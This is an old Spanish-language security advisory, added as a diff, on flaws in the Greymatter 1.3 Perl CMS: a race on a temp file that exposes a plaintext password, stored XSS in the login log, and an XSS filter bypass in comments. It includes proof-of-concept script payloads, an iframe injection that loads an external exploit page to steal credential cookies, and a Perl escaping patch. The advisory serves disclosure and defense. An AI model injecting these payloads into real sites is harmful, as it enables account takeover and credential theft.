@@ -1,0 +1,126 @@
+=======================
+Greymatter: Algunos fallos de seguridad
+=======================
+FraMe (frame at kernelpanik.org)
+http://www.kernelpanik.org
+=======================
+
+Greymatter 1.3 es un CMS escrito en PERL que usa ficheros de texto como sistema
+de backend. Actualmente es usado en muchas áreas: weblogs, sitios de noticias
+y grupos de trabajo, por citar algunos.
+
+Mientras probaba las caracteristicas de esta nueva versión, dado que esto no
+puede ser considerado una auditoría de código, he encontrado algunos fallos
+de seguridad no reportados hasta ahora.
+
+A continuación se expondrán, de menor a mayor índice de riesgo, los citados
+fallos y se darán algunas soluciones. 
+
+* ====================
+* Primero: gm-token.cgi
+* Tipo: Condición de carrera
+* Riesgo: Bajo
+* ====================
+Cuando GreyMatter reconstruye la sección "main entry  pages", por ejemplo: un
+template ha cambiado o un usuario ha presionado el botón rebuild, un fichero
+temporal es creado. El fichero es eliminado una vez que el proceso ha concluido.
+
+El fichero es creado con el nombre "gm-token.cgi", y con un formato como:
+
+$ cat gm-token.cgi
+gmXXXXXXXXXX ( donde X son números )
+nombre_de_usuario
+password_en_texto_plano
+
+El fichero es creado en el directorio "archives/", con permisos 0666 . Si el 
+directorio "archives/" not está dentro de "/cgi-bin", o en un directorio con permisos,
+cgi (ScriptAlias/+ExecCGI) cualquiera puede recuperar este fichero con un GET sobre 
+"archives/gm-token.cgi".
+
+Obviamente, obtener este fichero requiere usar un demonio chequeando constantemente.
+(Si obtienes el fichero en el primer GET, prueba jugar a la lotería) Este chequeo
+puede ser detectado de forma sencilla en los logs del servidor. No obstante, es un 
+ataque factible. Y bien puede ser combinado con los que se exponen abajo.
+
+¿Cómo solucionarlo?. Usando tmpnam(); una función de PERL para generar un nombre
+aleatorio.
+
+* ====================
+* Segundo: gm-cplog.cgi
+* Tipo: XSS
+* Riesgo: Medio
+* ====================
+
+gm-cplog.cgi es el nombre del fichero que guarda los logs de GreyMatter. 
+Los intentos de login tambien son almacenados. Sin embargo las variables
+suministradas en el proceso de login no son adecuadamente saneadas, así
+que un ataque XSS puede ser inyectado.
+
+¿Como explotarlo?. Vamos a cgi-bin/gm.cgi y ponemos algo como:
+
+Author:
+<SCRIPT language=JavaScript>alert("XSS")</SCRIPT>
+Passwd:
+<SCRIPT language=JavaScript>alert("XSS")</SCRIPT>
+
+Después, esperamos. Alguien presionará sobre "View Control Panel Log".
+
+Este exploit es sencillo de modificar para obtener los datos de forma
+remota.
+
+¿Cómo solucionarlo?. Filtrando todas las entradas que se guardan en gm-cplog.cgi
+
+* ====================
+* Tercero: gm-comments.cgi
+* Tipo: XSS
+* Riesgo: Medio/Alto
+* ====================
+
+En la versión 1.3 "gm-comments.cgi" tiene algunas mejoras en la seguridad. Por 
+ejemplo las inyecciones de código php son detectadas y se incluyen algunos
+métodos para evitar los XSS. No obstante, sigue siendo posible sobrepasar
+las protecciones contra los XSS.
+
+Por defecto, GreyMatter guarda una cookie con el usuario y la contraseña 
+que es usada en "cgi-bin/gm.cgi", robar esta cookie hace trivial el acceso
+a greymatter.
+
+¿Cómo explotarlo?. Insertando un comentario como el siguiente:
+
+Name: Your Name
+Email:
+Homepage:
+Content: <iframe src=http://domain.com/exploit.html
+</iframe
+
+$cat exploit.html
+No público, pero trivial.
+
+¿Cómo parchearlo?. Propongo, como parche temporal, el mismo que 
+propuse para corregir la injección de php en la v1.21d
+
+#========================================
+# XSS in 1.3 comment system.
+# Temporal and unofficial patch.
+# Written by FraMe ( frame at kernelpanik.org )
+
+# Convert "<"
+$IN{'newcommentbody'} =~ s/</\&lt\;/g;
+$IN{'newcommentauthor'} =~ s/</\&lt\;/g;
+$IN{'newcommentemail'} =~ s/</\&lt\;/g;
+$IN{'newcommenthomepage'} =~ s/</\&lt\;/g;
+
+# Convert ">"
+$IN{'newcommentbody'} =~ s/>/\&gt\;/g;
+$IN{'newcommentauthor'} =~ s/>/\&gt\;/g;
+$IN{'newcommentemail'} =~ s/>/\&gt\;/g;
+$IN{'newcommenthomepage'} =~ s/>/\&gt\;/g;
+
+#========================================
+
+Un saludo.
+
+--
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+
